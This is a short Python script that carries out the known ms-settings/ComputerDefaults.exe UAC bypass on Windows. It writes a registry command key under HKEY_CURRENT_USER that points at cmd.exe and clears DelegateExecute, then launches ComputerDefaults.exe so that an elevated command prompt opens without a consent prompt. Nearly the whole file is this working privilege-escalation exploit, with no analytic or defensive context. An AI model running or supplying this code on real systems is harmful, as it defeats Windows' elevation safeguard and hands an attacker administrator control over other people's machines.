import os
import sys
import ctypes
import winreg

def excalate():                       
    current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
    cmd = "C:\windows\System32\cmd.exe"           
    winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'Software\Classes\ms-settings\shell\open\command')
    reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\Classes\ms-settings\shell\open\command', 0, winreg.KEY_WRITE)                
    winreg.SetValueEx(reg_key, "DelegateExecute", 0, winreg.REG_SZ, "")        
    winreg.SetValueEx(reg_key, None, 0, winreg.REG_SZ, cmd)        
    winreg.CloseKey(reg_key)     
    os.system(r'C:\windows\system32\ComputerDefaults.exe')                      

if __name__ == '__main__':
    excalate()